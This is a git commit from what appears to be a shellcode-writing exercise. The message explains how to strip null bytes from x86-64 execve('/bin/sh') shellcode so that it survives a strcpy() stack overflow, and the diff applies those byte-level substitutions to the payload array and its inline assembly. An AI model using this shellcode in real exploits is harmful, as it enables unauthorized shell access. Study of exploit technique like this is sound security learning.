004b87de82928c2dd53abd50a71e1f5373c70db5
Ilan Smith <lunnys@gmail.com>
2015-12-30 17:20:51 +0200

    shellcode phase 4: zero tolerance
    While the shellcode works when hard coding its character buffer
    address instead of main's return address, it will not work as-is
    when being overflowed during exploitation of strcpy().
    The reason for is that there exist \x00 bytes in the middle
    of the shellcode and this will terminate overrunning with strcpy()
    prematurely before the entire buffer has been copied onto the stack.
    
    There can be many reasons for having a \x00 in the middle of the
    shellcode:
    1. Placing a 0 somewhere in memory on in a register
    2. Placing addresses/numbers consisting of 0's in an eightbyte
       representation
    3. Etc...
    
    The only place a \x00 must appear is at the end of the shellcode
    for NULL termination to control where strcpy() will eventually
    complete its copying.
    
    In most cases various alternatives exist for direct use of \x00
    in the assembly/machine code. For example:
    
    Instead of:
        "\x48\x8d\x05\x1e\x00\x00\x00"  /* lea    0x1e(%rip),%rax    */
             and
        "\xb8\x3b\x00\x00\x00"          /* mov    $0x3b,%eax         */
    do:
        "\x48\x8d\x05\x39\x11\x11\x11"  /* lea 0x11111139(%rip),%rax */
        "\x48\x2d\x11\x11\x11\x11"      /* sub    $0x11111111,%rax   */
             and
        "\xb8\x4c\x11\x11\x11"          /* mov    $0x3b,%eax         */
        "\x2d\x11\x11\x11\x11"          /* sub    $0x11111111,%eax   */
    
    Instead of:
        "\x48\xc7\x44\x24\x08\x00..."   /* movq   $0x0,0x8(%rsp)     */
    do:
        "\x48\x31\xc0"                  /* xor    %rax,%rax          */
        "\x48\x89\x44\x24\x08"          /* mov    %rax,0x8(%rsp)     */
    
    Note that due to the additional lines, the jmp/call offsets
    change a little.

--- naive.c
+++ naive.c
@@ -4,15 +4,18 @@
 #define MALICIOUS __attribute__ ((section(".text")))
 
 MALICIOUS char my_execve[] =
-	"\x48\x8d\x05\x20\x00\x00\x00"          /* lea    0x20(%rip),%rax    */
+	"\x48\x8d\x05\x39\x11\x11\x11"          /* lea 0x11111139(%rip),%rax */
+	"\x48\x2d\x11\x11\x11\x11"              /* sub    $0x11111111,%rax   */
 	"\xff\xe0"                              /* jmpq   *%rax              */
-	"\x48\xc7\x44\x24\x08\x00\x00\x00\x00"  /* movq   $0x0,0x8(%rsp)     */
+	"\x48\x31\xc0"                          /* xor    %rax,%rax          */
+	"\x48\x89\x44\x24\x08"                  /* mov    %rax,0x8(%rsp)     */
 	"\x48\x8b\x3c\x24"                      /* mov    (%rsp),%rdi        */
 	"\x48\x89\xe6"                          /* mov    %rsp,%rsi          */
-	"\x48\xc7\xc2\x00\x00\x00\x00"          /* mov    $0x0,%rdx          */
-	"\xb8\x3b\x00\x00\x00"                  /* mov    $0x3b,%eax         */
+	"\x48\x8b\x54\x24\x08"                  /* mov    0x8(%rsp),%rdx     */
+	"\xb8\x4c\x11\x11\x11"                  /* mov    $0x1111114c,%eax   */
+	"\x2d\x11\x11\x11\x11"                  /* sub    $0x11111111,%eax   */
 	"\x0f\x05"                              /* syscall                   */
-	"\x48\x8d\x05\xdb\xff\xff\xff"          /* lea    -0x25(%rip),%rax   */
+	"\x48\x8d\x05\xd9\xff\xff\xff"          /* lea    -0x27(%rip),%rax   */
 	"\xff\xd0"                              /* callq  *%rax              */
 	"\x2f\x62\x69\x6e\x2f\x73\x68\x00"      /* .string \"/bin/sh\"       */
 	;
@@ -23,22 +26,25 @@ int main(int argc, char **argv)
 	int ret = 0;
 
 #if defined(ASSEMBLY)
-	__asm__("lea 0x20(%rip),%rax");         /* load 'call' block address
-	                                           to $rax. Note: $rip is
+	__asm__("lea 0x11111139(%rip),%rax");   /* load 'call' block address */
+	__asm__("sub $0x11111111,%rax");        /* to $rax. Note: $rip is
 	                                           that of the next op       */
 	__asm__("jmp *%rax");                   /* jmp to 'call' block       */
-	__asm__("movq $0x0,0x8(%rsp)");         /* terminate execve's argv
+	__asm__("xor %rax,%rax");               /* zero out $rax register    */
+	__asm__("movq %rax,0x8(%rsp)");         /* terminate execve's argv
 	                                           array with a NULL         */
 	__asm__("mov 0x0(%rsp),%rdi");          /* set string address as
 	                                           execve's 1st param        */
 	__asm__("mov %rsp,%rsi");               /* set argv array address as
 	                                           execve's 2nd param        */
-	__asm__("mov $0x0,%rdx");          	/* set NULL for execve's 3rd
-	                                           parameter */
-	__asm__("mov $0x3b,%eax");              /* set 0x3b - execve's
-	                                           system call id in $eax    */
+	__asm__("mov 0x8(%rsp),%rdx");          /* set the same NULL that
+	                                           terminates the argv array
+	                                           as the envp NULL pointer
+	                                           for execve's 3rd param    */
+	__asm__("mov $0x1111114c,%eax");        /* set 0x1111114c - execve's */
+	__asm__("sub $0x11111111,%eax");        /* system call id in $eax    */
 	__asm__("syscall");                     /* execute the system call   */
-	__asm__("lea -0x25(%rip),%rax");        /* prepare to call back to
+	__asm__("lea -0x27(%rip),%rax");        /* prepare to call back to
 	                                           after the jmp instruction */
 	__asm__("callq *%rax");                 /* call back to after the
 	                                           jmp instruction           */
